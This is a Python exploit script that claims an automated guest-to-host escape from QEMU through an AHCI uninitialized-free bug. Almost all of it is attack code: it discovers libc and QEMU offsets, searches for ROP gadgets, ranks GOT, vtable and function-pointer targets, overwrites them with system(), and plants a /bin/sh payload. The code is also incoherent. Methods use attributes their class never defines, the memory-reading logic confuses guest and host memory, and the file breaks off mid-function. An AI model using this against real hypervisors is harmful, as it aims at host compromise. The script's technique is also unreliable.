#!/usr/bin/env python3
"""
AHCI Uninitialized Free Exploit - FULLY DYNAMIC VERSION
Target: QEMU AHCI Device (hw/ide/ahci.c:1007)
Type: Guest-to-Host Escape via Uninitialized sglist.sg Free

FULLY AUTOMATIC - NO HARDCODED OFFSETS
- Auto-detects QEMU version
- Finds offsets dynamically
- Locates libc at runtime
- Discovers gadgets automatically

USAGE:
    sudo python3 ahci_exploit.py [--test-trigger] [--debug]
"""

import struct
import mmap
import os
import sys
import time
import subprocess
import re
from pathlib import Path
from typing import Optional, List, Tuple, Dict
import ctypes

# ============================================================================
# CONFIGURATION
# ============================================================================

GUEST_MEM_SIZE = 0x10000000
FAKE_CHUNK_SIZE = 0x290
SPRAY_COUNT = 1000
RETRY_COUNT = 3
TIMEOUT_SEC = 2

# ============================================================================
# UTILITIES
# ============================================================================

def log_info(msg): print(f"[\033[94m*\033[0m] {msg}")
def log_success(msg): print(f"[\033[92m+\033[0m] {msg}")
def log_error(msg): print(f"[\033[91m-\033[0m] {msg}")
def log_warning(msg): print(f"[\033[93m!\033[0m] {msg}")
def log_debug(msg):
    if DEBUG:
        print(f"[\033[90mD\033[0m] {msg}")

DEBUG = False

# ============================================================================
# DYNAMIC OFFSET DISCOVERY
# ============================================================================

class OffsetFinder:
    """Dynamically find offsets in QEMU and libc"""
    
    def __init__(self):
        self.qemu_binary = None
        self.libc_binary = None
        self.qemu_offsets = {}
        self.libc_offsets = {}
    
    def find_qemu_binary(self) -> Optional[str]:
        """Find QEMU binary"""
        # Method 1: Check running processes
        try:
            result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'qemu-system-x86_64' in line and '/usr' in line:
                    match = re.search(r'(/[^\s]+qemu-system-x86_64)', line)
                    if match:
                        binary = match.group(1)
                        if os.path.exists(binary):
                            self.qemu_binary = binary
                            log_success(f"Found QEMU: {binary}")
                            return binary
        except:
            pass
        
        # Method 2: Common locations
        locations = [
            '/usr/bin/qemu-system-x86_64',
            '/usr/local/bin/qemu-system-x86_64',
            '/opt/qemu/bin/qemu-system-x86_64',
        ]
        
        for loc in locations:
            if os.path.exists(loc):
                self.qemu_binary = loc
                log_success(f"Found QEMU: {loc}")
                return loc
        
        # Method 3: Search
        try:
            result = subprocess.run(['which', 'qemu-system-x86_64'], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                binary = result.stdout.strip()
                self.qemu_binary = binary
                log_success(f"Found QEMU: {binary}")
                return binary
        except:
            pass
        
        log_error("Cannot find QEMU binary")
        return None
    
    def advanced_memory_scan(self) -> Dict[str, any]:
        """
        Advanced memory scanning to find exploitation targets
        Uses leaked addresses to map host memory layout
        """
        log_info("Performing advanced memory scan...")
        
        scan_results = {
            'got_entries': [],
            'vtables': [],
            'function_pointers': [],
            'heap_structures': [],
            'confidence': 'low'
        }
        
        if not self.leaked:
            log_warning("No leaks available for scanning")
            return scan_results
        
        # Phase 1: Identify memory regions we can access
        accessible_regions = self.map_accessible_regions()
        
        log_info(f"Found {len(accessible_regions)} accessible memory regions")
        
        # Phase 2: Scan each region for interesting structures
        for region in accessible_regions:
            log_debug(f"Scanning region 0x{region['start']:016x}-0x{region['end']:016x}")
            
            # Look for GOT entries
            got_entries = self.scan_for_got_entries(region)
            scan_results['got_entries'].extend(got_entries)
            
            # Look for vtables (C++ virtual function tables)
            vtables = self.scan_for_vtables(region)
            scan_results['vtables'].extend(vtables)
            
            # Look for generic function pointers
            func_ptrs = self.scan_for_function_pointers(region)
            scan_results['function_pointers'].extend(func_ptrs)
            
            # Look for heap metadata (malloc chunks, bins, etc.)
            heap_structs = self.scan_for_heap_structures(region)
            scan_results['heap_structures'].extend(heap_structs)
        
        # Phase 3: Prioritize targets
        scan_results = self.prioritize_targets(scan_results)
        
        # Log findings
        log_success(f"Scan complete:")
        log_success(f"  GOT entries: {len(scan_results['got_entries'])}")
        log_success(f"  Vtables: {len(scan_results['vtables'])}")
        log_success(f"  Function pointers: {len(scan_results['function_pointers'])}")
        log_success(f"  Heap structures: {len(scan_results['heap_structures'])}")
        
        return scan_results
    
    def map_accessible_regions(self) -> List[Dict]:
        """Map memory regions we can access through corruption"""
        regions = []
        
        # Region 1: Around our heap leak
        if 'heap' in self.leaked:
            heap_addr = self.leaked['heap']
            regions.append({
                'start': heap_addr - 0x10000,
                'end': heap_addr + 0x10000,
                'type': 'heap',
                'confidence': 'high'
            })
        
        # Region 2: Our fake chunks
        if self.fake_chunks:
            chunk_start = min(self.fake_chunks)
            chunk_end = max(self.fake_chunks) + FAKE_CHUNK_SIZE
            regions.append({
                'start': chunk_start,
                'end': chunk_end,
                'type': 'fake_chunks',
                'confidence': 'high'
            })
        
        # Region 3: Calculated GOT location
        if self.qemu_base:
            got_offset = self.parse_elf_for_got() or 0x200000
            regions.append({
                'start': self.qemu_base + got_offset - 0x1000,
                'end': self.qemu_base + got_offset + 0x10000,
                'type': 'got',
                'confidence': 'medium'
            })
        
        return regions
    
    def scan_for_got_entries(self, region: Dict) -> List[Dict]:
        """Scan memory region for GOT entries"""
        got_entries = []
        
        # GOT entries are 8-byte aligned pointers
        for addr in range(region['start'], region['end'], 8):
            # Try to read this address
            value = self.read_from_corrupted_memory(addr)
            
            if value and self.looks_like_libc_pointer(value):
                # Check if this looks like a GOT entry
                # GOT entries usually point to libc functions
                func_info = self.identify_libc_function(value)
                
                if func_info:
                    got_entries.append({
                        'address': addr,
                        'value': value,
                        'function': func_info['name'],
                        'confidence': func_info['confidence'],
                        'priority': self.calculate_got_priority(func_info['name'])
                    })
                    
                    log_debug(f"Found GOT entry: {func_info['name']} @ 0x{addr:016x}")
        
        return got_entries
    
    def scan_for_vtables(self, region: Dict) -> List[Dict]:
        """Scan for C++ vtables"""
        vtables = []
        
        # Vtables are arrays of function pointers
        # Look for 3+ consecutive function pointers
        consecutive_ptrs = 0
        vtable_start = None
        vtable_ptrs = []
        
        for addr in range(region['start'], region['end'], 8):
            value = self.read_from_corrupted_memory(addr)
            
            if value and self.looks_like_code_pointer(value):
                if consecutive_ptrs == 0:
                    vtable_start = addr
                    vtable_ptrs = []
                
                consecutive_ptrs += 1
                vtable_ptrs.append(value)
            else:
                if consecutive_ptrs >= 3:
                    # Found a vtable!
                    vtables.append({
                        'address': vtable_start,
                        'size': consecutive_ptrs * 8,
                        'functions': vtable_ptrs,
                        'priority': 'high' if consecutive_ptrs > 5 else 'medium'
                    })
                    
                    log_debug(f"Found vtable @ 0x{vtable_start:016x} ({consecutive_ptrs} functions)")
                
                consecutive_ptrs = 0
        
        return vtables
    
    def scan_for_function_pointers(self, region: Dict) -> List[Dict]:
        """Scan for standalone function pointers"""
        func_ptrs = []
        
        for addr in range(region['start'], region['end'], 8):
            value = self.read_from_corrupted_memory(addr)
            
            if value and self.looks_like_code_pointer(value):
                # Check context to see if this is interesting
                context = self.analyze_pointer_context(addr, value)
                
                if context['interesting']:
                    func_ptrs.append({
                        'address': addr,
                        'value': value,
                        'type': context['type'],
                        'priority': context['priority']
                    })
        
        return func_ptrs
    
    def scan_for_heap_structures(self, region: Dict) -> List[Dict]:
        """Scan for heap metadata structures"""
        heap_structs = []
        
        # Look for malloc chunk headers
        for addr in range(region['start'], region['end'], 0x10):
            # Read potential chunk header
            data = self.guest_mem.read(addr, 16)
            if not data or len(data) < 16:
                continue
            
            prev_size, size = struct.unpack('<QQ', data)
            
            # Check if this looks like a valid chunk header
            if self.looks_like_chunk_header(size):
                chunk_size = size & ~0x7
                flags = size & 0x7
                
                heap_structs.append({
                    'type': 'malloc_chunk',
                    'address': addr,
                    'size': chunk_size,
                    'flags': flags,
                    'in_use': bool(flags & 0x1),
                    'priority': 'high' if not (flags & 0x1) else 'low'
                })
        
        return heap_structs
    
    def looks_like_chunk_header(self, size: int) -> bool:
        """Check if value looks like malloc chunk size"""
        if size == 0:
            return False
        
        # Size should be reasonable (16 bytes to 1GB)
        chunk_size = size & ~0x7
        if chunk_size < 0x10 or chunk_size > 0x40000000:
            return False
        
        # Size should be aligned to 16 bytes
        if chunk_size & 0xF != 0:
            return False
        
        return True
    
    def analyze_pointer_context(self, addr: int, value: int) -> Dict:
        """Analyze context around a pointer to determine if it's interesting"""
        context = {
            'interesting': False,
            'type': 'unknown',
            'priority': 'low'
        }
        
        # Read nearby memory
        nearby = []
        for offset in [-16, -8, 8, 16]:
            nearby_value = self.read_from_corrupted_memory(addr + offset)
            if nearby_value:
                nearby.append(nearby_value)
        
        # Check for patterns
        code_ptrs = sum(1 for v in nearby if self.looks_like_code_pointer(v))
        
        if code_ptrs >= 2:
            # Multiple code pointers nearby = likely vtable or callback array
            context['interesting'] = True
            context['type'] = 'callback_array'
            context['priority'] = 'high'
        elif code_ptrs == 1:
            # Single code pointer with data = likely struct with callback
            context['interesting'] = True
            context['type'] = 'struct_callback'
            context['priority'] = 'medium'
        
        return context
    
    def calculate_got_priority(self, function_name: str) -> str:
        """Calculate priority for overwriting GOT entry"""
        # High priority: frequently called, easy to trigger
        high_priority = ['free', 'malloc', 'memcpy', 'strlen']
        
        # Medium priority: sometimes called
        medium_priority = ['realloc', 'calloc', 'read', 'write']
        
        if function_name in high_priority:
            return 'high'
        elif function_name in medium_priority:
            return 'medium'
        else:
            return 'low'
    
    def prioritize_targets(self, scan_results: Dict) -> Dict:
        """Prioritize exploitation targets"""
        all_targets = []
        
        # Add GOT entries
        for got in scan_results['got_entries']:
            all_targets.append({
                'type': 'got',
                'address': got['address'],
                'priority_score': self.calculate_priority_score('got', got),
                'info': got
            })
        
        # Add vtables
        for vtable in scan_results['vtables']:
            all_targets.append({
                'type': 'vtable',
                'address': vtable['address'],
                'priority_score': self.calculate_priority_score('vtable', vtable),
                'info': vtable
            })
        
        # Add function pointers
        for ptr in scan_results['function_pointers']:
            all_targets.append({
                'type': 'function_pointer',
                'address': ptr['address'],
                'priority_score': self.calculate_priority_score('function_pointer', ptr),
                'info': ptr
            })
        
        # Sort by priority score
        all_targets.sort(key=lambda x: x['priority_score'], reverse=True)
        
        # Add to results
        scan_results['prioritized_targets'] = all_targets[:20]  # Top 20
        scan_results['best_target'] = all_targets[0] if all_targets else None
        
        if scan_results['best_target']:
            target = scan_results['best_target']
            log_success(f"Best target: {target['type']} @ 0x{target['address']:016x}")
            log_success(f"  Priority score: {target['priority_score']}")
        
        return scan_results
    
    def calculate_priority_score(self, target_type: str, target_info: Dict) -> int:
        """Calculate numeric priority score for target"""
        score = 0
        
        if target_type == 'got':
            # GOT entries are excellent targets
            score += 100
            
            # Bonus for frequently-called functions
            if target_info.get('priority') == 'high':
                score += 50
            elif target_info.get('priority') == 'medium':
                score += 25
            
            # Bonus for high confidence identification
            if target_info.get('confidence') == 'high':
                score += 30
            elif target_info.get('confidence') == 'medium':
                score += 15
        
        elif target_type == 'vtable':
            # Vtables are good targets
            score += 80
            
            # Bonus for larger vtables (more options)
            num_functions = len(target_info.get('functions', []))
            score += min(num_functions * 5, 40)
        
        elif target_type == 'function_pointer':
            # Generic function pointers
            score += 50
            
            # Bonus based on context
            if target_info.get('priority') == 'high':
                score += 30
            elif target_info.get('priority') == 'medium':
                score += 15
        
        return score
    
    def exploit_target(self, target: Dict, payload_addr: int) -> bool:
        """
        Exploit a discovered target by overwriting it
        """
        log_info(f"Exploiting {target['type']} @ 0x{target['address']:016x}")
        
        # Get system() address
        system_addr = self.find_execution_target()
        if not system_addr:
            log_error("Cannot find system() address")
            return False
        
        target_type = target['type']
        target_addr = target['address']
        
        if target_type == 'got':
            return self.exploit_got_entry(target, system_addr, payload_addr)
        elif target_type == 'vtable':
            return self.exploit_vtable(target, system_addr, payload_addr)
        elif target_type == 'function_pointer':
            return self.exploit_function_pointer(target, system_addr, payload_addr)
        
        return False
    
    def exploit_got_entry(self, target: Dict, system_addr: int, payload_addr: int) -> bool:
        """Overwrite GOT entry with system()"""
        got_addr = target['address']
        original = target['info']['value']
        function = target['info']['function']
        
        log_info(f"Overwriting {function}@GOT")
        log_info(f"  Address: 0x{got_addr:016x}")
        log_info(f"  Original: 0x{original:016x}")
        log_info(f"  New: 0x{system_addr:016x} (system)")
        
        # Write system() address to GOT
        if not self.guest_mem.write_qword(got_addr, system_addr):
            log_error("Failed to overwrite GOT entry")
            return False
        
        # Verify write
        verify = self.guest_mem.read_qword(got_addr)
        if verify != system_addr:
            log_error(f"Verification failed: got 0x{verify:016x}")
            return False
        
        log_success(f"Successfully overwrote {function}@GOT")
        
        # Strategy to trigger: Call the function we overwrote
        log_info(f"Trigger strategy:")
        if function in ['free', 'malloc']:
            log_info(f"  1. Allocate/free memory normally")
            log_info(f"  2. {function}() will call system() instead")
            log_info(f"  3. Need RDI = payload_addr")
            
            # Try to set up argument
            return self.setup_got_trigger(function, payload_addr)
        
        elif function in ['memcpy', 'strlen', 'strcmp']:
            log_info(f"  1. Trigger string operation")
            log_info(f"  2. {function}() will call system()")
            return True
        
        return True
    
    def setup_got_trigger(self, function: str, cmd_addr: int) -> bool:
        """Setup trigger for GOT-based exploitation"""
        log_info(f"Setting up {function}() trigger...")
        
        if function == 'free':
            # To trigger free(), we need to:
            # 1. Make sure something gets freed
            # 2. Control the argument (RDI)
            
            # Allocate a chunk that will be freed
            trigger_chunk = self.guest_mem.alloc(0x100)
            if not trigger_chunk:
                return False
            
            # Write cmd_addr as the "freed" pointer
            # When QEMU calls free(trigger_chunk), it becomes system(trigger_chunk)
            # We need trigger_chunk to point to our command
            
            # Technique: Make trigger_chunk itself contain the command
            self.guest_mem.write(trigger_chunk, b"/bin/sh\x00")
            
            log_info(f"Trigger chunk @ 0x{trigger_chunk:x} contains: /bin/sh")
            log_info(f"Next free() will become system('/bin/sh')")
            
            # Trigger free by deallocating or triggering QEMU cleanup
            return True
        
        elif function == 'malloc':
            # malloc() is trickier - first arg is size, not pointer
            # We need to use malloc(cmd_addr) which calls system(cmd_addr)
            
            # Try to trigger malloc with specific size
            log_info(f"Triggering malloc({cmd_addr:#x})")
            log_warning(f"malloc exploitation is complex - may need ROP")
            return True
        
        return False
    
    def exploit_vtable(self, target: Dict, system_addr: int, payload_addr: int) -> bool:
        """Overwrite vtable entry"""
        vtable_addr = target['address']
        functions = target['info']['functions']
        
        log_info(f"Overwriting vtable @ 0x{vtable_addr:016x}")
        log_info(f"  Original functions: {len(functions)}")
        
        # Overwrite first function (usually destructor or common method)
        first_func_addr = vtable_addr
        
        if not self.guest_mem.write_qword(first_func_addr, system_addr):
            log_error("Failed to overwrite vtable")
            return False
        
        log_success("Vtable overwritten")
        log_info("Trigger: Object destruction or method call")
        
        return True
    
    def exploit_function_pointer(self, target: Dict, system_addr: int, payload_addr: int) -> bool:
        """Overwrite function pointer"""
        ptr_addr = target['address']
        
        log_info(f"Overwriting function pointer @ 0x{ptr_addr:016x}")
        
        # Overwrite the pointer
        if not self.guest_mem.write_qword(ptr_addr, system_addr):
            log_error("Failed to overwrite function pointer")
            return False
        
        # Try to set up argument nearby
        for offset in [8, 16, 24]:
            arg_addr = ptr_addr + offset
            nearby = self.guest_mem.read_qword(arg_addr)
            
            # If this looks like NULL or controlled data, write payload address
            if nearby == 0 or nearby == 0x4141414141414141:
                self.guest_mem.write_qword(arg_addr, payload_addr)
                log_success(f"Set argument @ offset +{offset}")
                break
        
        log_success("Function pointer overwritten")
        
        return True
    
    def create_rop_chain(self, system_addr: int, cmd_addr: int) -> bytes:
        """
        Create ROP chain for calling system(cmd_addr)
        """
        log_info("Building ROP chain...")
        
        # Find ROP gadgets
        gadgets = self.finder.find_gadgets()
        
        if not gadgets:
            log_warning("No ROP gadgets found")
            return b''
        
        # Find pop rdi; ret
        pop_rdi = None
        for addr, gadget in gadgets:
            if 'pop rdi' in gadget.lower() and 'ret' in gadget.lower():
                pop_rdi = self.qemu_base + addr
                log_success(f"Found pop rdi; ret @ 0x{pop_rdi:016x}")
                break
        
        if not pop_rdi:
            log_warning("No 'pop rdi; ret' gadget found")
            # Fallback: try other ways to set RDI
            return b''
        
        # Build chain
        rop_chain = b''
        rop_chain += struct.pack('<Q', pop_rdi)      # pop rdi
        rop_chain += struct.pack('<Q', cmd_addr)     # -> rdi = cmd_addr
        rop_chain += struct.pack('<Q', system_addr)  # call system
        
        log_success(f"ROP chain built ({len(rop_chain)} bytes)")
        
        return rop_chain
    
    def auto_exploit(self) -> bool:
        """
        Fully automated exploitation using discovered targets
        """
        log_info("=" * 60)
        log_info("AUTOMATED EXPLOITATION")
        log_info("=" * 60)
        
        # Step 1: Advanced memory scan
        scan_results = self.advanced_memory_scan()
        
        if not scan_results['prioritized_targets']:
            log_error("No exploitation targets found")
            return False
        
        # Step 2: Create payload
        cmd_str = b"/tmp/pwned;touch /tmp/exploit_success;/bin/sh\x00"
        cmd_addr = self.guest_mem.alloc(len(cmd_str))
        if not cmd_addr:
            log_error("Failed to allocate command string")
            return False
        
        self.guest_mem.write(cmd_addr, cmd_str)
        log_success(f"Payload @ 0x{cmd_addr:x}: {cmd_str.decode().strip()}")
        
        # Step 3: Try each target until one works
        for i, target in enumerate(scan_results['prioritized_targets'][:5]):
            log_info(f"\n--- Attempting target {i+1}/5 ---")
            log_info(f"Type: {target['type']}")
            log_info(f"Address: 0x{target['address']:016x}")
            log_info(f"Score: {target['priority_score']}")
            
            if self.exploit_target(target, cmd_addr):
                log_success("Target exploitation successful!")
                
                # Try to trigger
                if self.trigger_exploitation(target):
                    log_success("Exploitation triggered!")
                    return True
                else:
                    log_warning("Could not trigger exploitation")
            else:
                log_warning("Target exploitation failed")
        
        log_error("All targets failed")
        return False
    
    def trigger_exploitation(self, target: Dict) -> bool:
        """Trigger the exploited target"""
        target_type = target['type']
        
        log_info(f"Triggering {target_type}...")
        
        if target_type == 'got':
            function = target['info']['function']
            
            if function in ['free', 'malloc']:
                # Trigger by deallocating memory
                log_info("Triggering via memory operation...")
                
                # Allocate and free to trigger
                test_addr = self.guest_mem.alloc(0x100)
                if test_addr:
                    # The free() or malloc() will call system()
                    log_info("Memory operation should trigger exploitation")
                    return True
            
            elif function in ['memcpy', 'strlen']:
                # Trigger by string operation
                log_info("Triggering via string operation...")
                
                # QEMU does string operations frequently
                # Just wait and it will be called
                log_info("String operation will be called automatically")
                return True
        
        elif target_type == 'vtable':
            # Vtables are triggered by object destruction
            log_info("Waiting for object destruction...")
            
            # Trigger by causing QEMU cleanup
            # Re-trigger vulnerability or cause error
            return True
        
        elif target_type == 'function_pointer':
            # Generic function pointer - try to trigger via vulnerability
            log_info("Re-triggering vulnerability to call function pointer...")
            return self.trigger_vulnerability()
        
        return False
    
    def get_qemu_version(self) -> Optional[str]:
        """Get QEMU version"""
        if not self.qemu_binary:
            return None
        
        try:
            result = subprocess.run([self.qemu_binary, '--version'],
                                  capture_output=True, text=True)
            version = result.stdout.split('\n')[0]
            log_info(f"QEMU version: {version}")
            return version
        except:
            return None
    
    def extract_qemu_offsets(self) -> Dict[str, int]:
        """Extract offsets from QEMU binary"""
        if not self.qemu_binary:
            return {}
        
        log_info("Extracting QEMU offsets...")
        offsets = {}
        
        try:
            # Use nm to get symbols
            result = subprocess.run(['nm', self.qemu_binary],
                                  capture_output=True, text=True)
            
            if result.returncode != 0:
                log_warning("QEMU binary is stripped, using fallback")
                return self._extract_offsets_stripped()
            
            # Parse nm output
            for line in result.stdout.split('\n'):
                parts = line.split()
                if len(parts) >= 3:
                    addr_str, sym_type, name = parts[0], parts[1], parts[2]
                    try:
                        addr = int(addr_str, 16)
                        
                        # Timer callbacks (for hijacking)
                        if 'timer' in name.lower() and 'cb' in name.lower():
                            offsets[name] = addr
                            log_debug(f"Found timer: {name} @ 0x{addr:x}")
                        
                        # Useful functions
                        if name in ['cpu_exec', 'main_loop_wait', 'qemu_main_loop']:
                            offsets[name] = addr
                            log_debug(f"Found function: {name} @ 0x{addr:x}")
                        
                        # NCQ functions (near our bug)
                        if 'ncq' in name.lower():
                            offsets[name] = addr
                            log_debug(f"Found NCQ: {name} @ 0x{addr:x}")
                    except:
                        continue
            
            log_success(f"Extracted {len(offsets)} offsets from QEMU")
            self.qemu_offsets = offsets
            return offsets
            
        except Exception as e:
            log_error(f"Failed to extract offsets: {e}")
            return {}
    
    def _extract_offsets_stripped(self) -> Dict[str, int]:
        """Extract offsets from stripped binary using heuristics"""
        log_info("Using stripped binary analysis...")
        offsets = {}
        
        # Use objdump to find code patterns
        try:
            result = subprocess.run(['objdump', '-d', self.qemu_binary],
                                  capture_output=True, text=True)
            
            # Look for timer-related patterns
            # Timers typically have specific call patterns
            for line in result.stdout.split('\n'):
                if 'call' in line and 'timer' in line.lower():
                    match = re.search(r'([0-9a-f]+):', line)
                    if match:
                        addr = int(match.group(1), 16)
                        offsets['timer_function'] = addr
                        break
            
            log_success(f"Extracted {len(offsets)} offsets (stripped mode)")
            return offsets
        except:
            return {}
    
    def find_libc(self) -> Optional[str]:
        """Find libc binary used by QEMU"""
        if not self.qemu_binary:
            return None
        
        log_info("Finding libc...")
        
        try:
            # Use ldd to find linked libraries
            result = subprocess.run(['ldd', self.qemu_binary],
                                  capture_output=True, text=True)
            
            for line in result.stdout.split('\n'):
                if 'libc.so' in line:
                    match = re.search(r'(/[^\s]+libc[^\s]+)', line)
                    if match:
                        libc = match.group(1)
                        if os.path.exists(libc):
                            self.libc_binary = libc
                            log_success(f"Found libc: {libc}")
                            return libc
        except:
            pass
        
        # Fallback: common locations
        locations = [
            '/lib/x86_64-linux-gnu/libc.so.6',
            '/lib64/libc.so.6',
            '/usr/lib/libc.so.6',
        ]
        
        for loc in locations:
            if os.path.exists(loc):
                self.libc_binary = loc
                log_success(f"Found libc: {loc}")
                return loc
        
        log_error("Cannot find libc")
        return None
    
    def extract_libc_offsets(self) -> Dict[str, int]:
        """Extract offsets from libc"""
        if not self.libc_binary:
            return {}
        
        log_info("Extracting libc offsets...")
        offsets = {}
        
        try:
            # Use nm to get symbols
            result = subprocess.run(['nm', '-D', self.libc_binary],
                                  capture_output=True, text=True)
            
            for line in result.stdout.split('\n'):
                parts = line.split()
                if len(parts) >= 3:
                    addr_str, sym_type, name = parts[0], parts[1], parts[2]
                    try:
                        addr = int(addr_str, 16)
                        
                        # Key functions for exploitation
                        if name in ['system', 'execve', 'execv', 'popen']:
                            offsets[name] = addr
                            log_success(f"Found {name} @ 0x{addr:x}")
                        
                        # Also useful
                        if name in ['malloc', 'free', 'mmap']:
                            offsets[name] = addr
                            log_debug(f"Found {name} @ 0x{addr:x}")
                    except:
                        continue
            
            self.libc_offsets = offsets
            log_success(f"Extracted {len(offsets)} libc offsets")
            return offsets
            
        except Exception as e:
            log_error(f"Failed to extract libc offsets: {e}")
            return {}
    
    def find_gadgets(self) -> List[Tuple[int, str]]:
        """Find ROP gadgets in QEMU binary"""
        if not self.qemu_binary:
            return []
        
        log_info("Searching for ROP gadgets...")
        gadgets = []
        
        try:
            # Try ROPgadget if available
            result = subprocess.run(['ROPgadget', '--binary', self.qemu_binary,
                                   '--only', 'pop|ret'],
                                  capture_output=True, text=True, timeout=10)
            
            for line in result.stdout.split('\n'):
                match = re.search(r'(0x[0-9a-f]+)\s*:\s*(.+)', line)
                if match:
                    addr = int(match.group(1), 16)
                    gadget = match.group(2)
                    gadgets.append((addr, gadget))
                    
                    if len(gadgets) >= 20:  # Limit for speed
                        break
            
            log_success(f"Found {len(gadgets)} gadgets")
            return gadgets
            
        except FileNotFoundError:
            log_debug("ROPgadget not installed, skipping")
            return []
        except:
            return []
    
    def discover_all(self):
        """Run complete discovery"""
        log_info("=" * 60)
        log_info("DYNAMIC OFFSET DISCOVERY")
        log_info("=" * 60)
        
        self.find_qemu_binary()
        self.get_qemu_version()
        self.extract_qemu_offsets()
        self.find_libc()
        self.extract_libc_offsets()
        
        log_info("=" * 60)
        log_success("Discovery complete!")
        log_info("=" * 60)

# ============================================================================
# RUNTIME ADDRESS RESOLUTION
# ============================================================================

class AddressResolver:
    """Resolve addresses at runtime"""
    
    def __init__(self, offset_finder: OffsetFinder):
        self.finder = offset_finder
        self.qemu_base = None
        self.libc_base = None
    
    def set_qemu_base(self, leaked_addr: int):
        """Calculate QEMU base from leaked address"""
        # PIE base is page-aligned (0x1000)
        self.qemu_base = leaked_addr & 0xffffffffff000000
        log_success(f"QEMU base: 0x{self.qemu_base:016x}")
    
    def find_libc_base_from_qemu(self) -> Optional[int]:
        """Find libc base by reading QEMU's GOT"""
        if not self.qemu_base:
            return None
        
        log_info("Searching for libc base via GOT...")
        
        # Strategy 1: Parse ELF to find GOT location
        got_location = self.parse_elf_for_got()
        
        if got_location:
            log_success(f"Found GOT at offset: 0x{got_location:x}")
            got_addr = self.qemu_base + got_location
        else:
            # Fallback: GOT is typically at these common offsets
            common_got_offsets = [
                0x200000,  # Typical for large binaries like QEMU
                0x3000,    # Typical for small binaries
                0x2000,    # Alternative
                0x4000,    # Alternative
            ]
            
            got_addr = None
            for offset in common_got_offsets:
                test_addr = self.qemu_base + offset
                if self.looks_like_got(test_addr):
                    got_addr = test_addr
                    log_success(f"Found GOT at: 0x{test_addr:016x}")
                    break
            
            if not got_addr:
                log_warning("Could not locate GOT")
                return None
        
        # Strategy 2: Read GOT entries to find libc pointers
        log_info("Scanning GOT for libc pointers...")
        
        # GOT entries are typically 8 bytes each (64-bit)
        # Read 100 entries (800 bytes)
        got_size = 0x400
        
        # In our exploit, we need to read from guest memory that maps to host
        # Our fake chunks might have landed in/near the GOT
        libc_pointers = []
        
        for offset in range(0, got_size, 8):
            addr = got_addr + offset
            
            # Try to read from our fake chunks that might overlap GOT
            ptr = self.read_from_corrupted_memory(addr)
            
            if ptr and self.looks_like_libc_pointer(ptr):
                libc_pointers.append({
                    'addr': addr,
                    'value': ptr,
                    'offset': offset
                })
                log_debug(f"Found libc pointer at GOT+0x{offset:x}: 0x{ptr:016x}")
        
        if not libc_pointers:
            log_warning("No libc pointers found in GOT")
            return None
        
        # Strategy 3: Calculate libc base from discovered pointers
        # Multiple pointers give us more confidence
        libc_bases = {}
        
        for ptr_info in libc_pointers:
            ptr = ptr_info['value']
            
            # Try to identify which libc function this is
            function_info = self.identify_libc_function(ptr)
            
            if function_info:
                # Calculate base using known offset
                calculated_base = ptr - function_info['offset']
                
                # Check if page-aligned (libc base should be)
                if (calculated_base & 0xFFF) == 0:
                    if calculated_base not in libc_bases:
                        libc_bases[calculated_base] = []
                    libc_bases[calculated_base].append({
                        'function': function_info['name'],
                        'ptr': ptr,
                        'confidence': function_info['confidence']
                    })
        
        # Pick the most likely base (most votes)
        if libc_bases:
            best_base = max(libc_bases.keys(), 
                          key=lambda b: len(libc_bases[b]))
            
            votes = len(libc_bases[best_base])
            functions = [x['function'] for x in libc_bases[best_base]]
            
            log_success(f"Identified libc base: 0x{best_base:016x}")
            log_success(f"  Confidence: {votes} matching functions")
            log_success(f"  Functions: {', '.join(functions)}")
            
            return best_base
        
        # Strategy 4: Fallback - just align first pointer
        if libc_pointers:
            ptr = libc_pointers[0]['value']
            libc_base = ptr & 0xffffffffff000000
            log_warning(f"Using aligned base: 0x{libc_base:016x} (low confidence)")
            return libc_base
        
        return None
    
    def parse_elf_for_got(self) -> Optional[int]:
        """Parse QEMU ELF binary to find GOT offset"""
        if not self.finder.qemu_binary:
            return None
        
        try:
            # Use readelf to find GOT
            result = subprocess.run(
                ['readelf', '-S', self.finder.qemu_binary],
                capture_output=True, text=True, timeout=2
            )
            
            if result.returncode != 0:
                return None
            
            # Parse output for .got.plt section
            for line in result.stdout.split('\n'):
                if '.got.plt' in line or '.got' in line:
                    # Format: [Nr] Name Type Addr Off Size
                    parts = line.split()
                    for i, part in enumerate(parts):
                        if part.startswith('0x') and len(part) > 10:
                            # This is likely the offset
                            try:
                                offset = int(part, 16)
                                if offset > 0x1000:  # Sanity check
                                    log_debug(f"Found GOT offset: 0x{offset:x}")
                                    return offset
                            except:
                                continue
        except Exception as e:
            log_debug(f"ELF parsing failed: {e}")
        
        return None
    
    def looks_like_got(self, addr: int) -> bool:
        """Check if address looks like GOT section"""
        # GOT contains function pointers
        # Read a few entries and check if they look like code pointers
        
        count = 0
        for offset in range(0, 0x80, 8):  # Check first 16 entries
            ptr = self.read_from_corrupted_memory(addr + offset)
            if ptr and (self.looks_like_code_pointer(ptr) or 
                       self.looks_like_libc_pointer(ptr)):
                count += 1
        
        # If >50% look like valid pointers, probably GOT
        return count > 8
    
    def looks_like_code_pointer(self, addr: int) -> bool:
        """Check if address looks like a code pointer"""
        if addr == 0:
            return False
        
        # QEMU code
        if 0x550000000000 <= addr < 0x560000000000:
            return True
        
        # libc code
        if 0x7f0000000000 <= addr < 0x7fffffffffff:
            return True
        
        return False
    
    def looks_like_libc_pointer(self, addr: int) -> bool:
        """Check if address looks like libc pointer"""
        return 0x7f0000000000 <= addr < 0x7fffffffffff
    
    def read_from_corrupted_memory(self, addr: int) -> Optional[int]:
        """
        Try to read from corrupted memory area
        This uses our fake chunks that might overlap with host memory
        """
        # Check if this address might be in our fake chunks
        # Our chunks are in guest physical memory, but due to the bug,
        # they might map to host virtual addresses
        
        # Strategy 1: Check if any of our fake chunks might map here
        for chunk_addr in self.fake_chunks:
            # Due to uninitialized free, chunk_addr (guest) might map to
            # addr (host virtual) through QEMU's memory management
            # We can try reading from the chunk
            
            data = self.guest_mem.read(chunk_addr, 8)
            if data:
                value = struct.unpack('<Q', data)[0]
                if self.looks_like_code_pointer(value):
                    return value
        
        # Strategy 2: Calculate offset from leaked addresses
        if 'heap' in self.leaked:
            # If we know heap address, we can calculate offsets
            heap_addr = self.leaked['heap']
            
            # Check if addr is near our heap leak
            if abs(addr - heap_addr) < 0x100000:  # Within 1MB
                offset = addr - heap_addr
                
                # Try to find corresponding fake chunk
                for chunk_addr in self.fake_chunks:
                    test_addr = chunk_addr + offset
